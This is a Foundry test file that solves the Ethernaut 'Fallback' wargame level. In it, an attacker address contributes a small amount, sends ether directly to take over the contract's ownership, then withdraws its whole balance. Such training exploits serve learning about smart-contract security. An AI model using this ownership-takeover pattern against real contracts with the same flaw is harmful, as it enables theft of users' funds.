// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";
import "../src/levels/Fallback/Fallback.sol";
import "../src/levels/Fallback/FallbackFactory.sol";

contract FallbackTest is Test {
    FallbackFactory public factory;
    address payable public instance;
    address public player = address(0x01);
    address public attacker = address(0x02);

    function setUp() public {
        factory = new FallbackFactory();
        instance = payable(factory.createInstance(player));

        emit log_address(Fallback(instance).owner());
        emit log_address(Fallback(instance).owner());
    }

    function testFallbackAttack() public {
        // SETUP
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);

        // EXPLOIT
        Fallback(instance).contribute{value: 1}();
        (bool success,) = instance.call{value: 1}("");

        if (success) {
            Fallback(instance).withdraw();
            assertTrue(factory.validateInstance(instance, attacker));
        }
        assertEq(instance.balance, 0);

        emit log_uint(attacker.balance);
        emit log_address(Fallback(instance).owner());
    }
}
